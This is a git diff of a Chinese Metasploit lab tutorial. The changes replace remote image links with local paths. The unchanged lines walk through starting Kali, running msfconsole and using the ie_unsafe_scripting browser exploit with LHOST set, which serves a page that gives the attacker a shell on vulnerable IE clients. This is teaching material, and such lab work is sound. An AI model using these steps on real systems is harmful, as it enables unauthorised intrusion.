@@ -40,14 +40,14 @@
 # 启动 Kali Linux 虚拟机
 sudo virsh start Kali
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483597810937.png-wm)
+![图片描述](../imgs/1483597810937.png-wm.png)
 
 在开启命令之后，需要等待一会让 Kali Linux 完全地启动。如果启动未完全就进行连接，则会报错。大概三十秒到一分钟左右后，在宿主机终端中输入如下命令，连接 Kali Linux 虚拟机,，其默认密码为 `toor`：
 ```
 # 连接 Kali Linux 虚拟机
 ssh root@Kali
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483598133723.png-wm)
+![图片描述](../imgs/1483598133723.png-wm.png)
 
 ## 3. 基本知识介绍
 
@@ -81,7 +81,7 @@ Metasploit 项目是一个旨在提供安全漏洞信息计算机安全项目，
 ```
 root@Kali:~# msfconsole
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483601807395.png-wm)
+![图片描述](../imgs/1483601807395.png-wm.png)
 
 ### 3.4 攻击的 IE 浏览器漏洞介绍
 
@@ -102,7 +102,7 @@ root@Kali:~# msfconsole
 # 查找相应的模块信息
 msf > search ie_unsafe_scripting
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483604660380.png-wm)
+![图片描述](../imgs/1483604660380.png-wm.png)
 
 对于 `ie_unsafe_scripting`  的源码部分，可以通过 `cat` 命令进行查看。`Metasploit` 的攻击模块由 Ruby 语言进行编写。攻击 IE 漏洞的模块关键部分源码如下所示：
 ```
@@ -253,7 +253,7 @@ var #{var_shellobj} = new ActiveXObject("WScript.Shell");
 # 使用已经集成的攻击模块
 msf > use exploit/windows/browser/ie_unsafe_scripting
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483608451092.png-wm)
+![图片描述](../imgs/1483608451092.png-wm.png)
 
 接着使用 `set` 命令设置攻击载荷，并使用 `show options` 命令参数查看需要填写的选项，最后使用 `set` 命令设置攻击机的 IP 地址：
 ```
@@ -266,20 +266,20 @@ msf > show options
 # 设置主机 IP 地址
 msf > set LHOST 192.168.122.101
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483610486105.png-wm)
+![图片描述](../imgs/1483610486105.png-wm.png)
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483610662869.png-wm)
+![图片描述](../imgs/1483610662869.png-wm.png)
 
 接着输入最后的攻击命令 `exploit`，此时攻击机进入监听状态，只要有缺陷的目标靶机访问了攻击机生成的网页页面，其中由于 `ActiveX` 的缺陷，使得攻击者获取目标靶机管理权限，建立 shell 通道：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483610888830.png-wm)
+![图片描述](../imgs/1483610888830.png-wm.png)
 
 由图可以知道，其生成的网页地址如下所示：
 ```
 # 生成的网页地址
 http://192.168.122.101:8080/slJnjsqppUdD34
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483611060979.png-wm)
+![图片描述](../imgs/1483611060979.png-wm.png)
 
 启动后服务器端进入监听状态，由于实验楼环境上没有安装 Windows 环境，所以最后一步使用 IE 浏览器访问该地址无法进行演示。
 
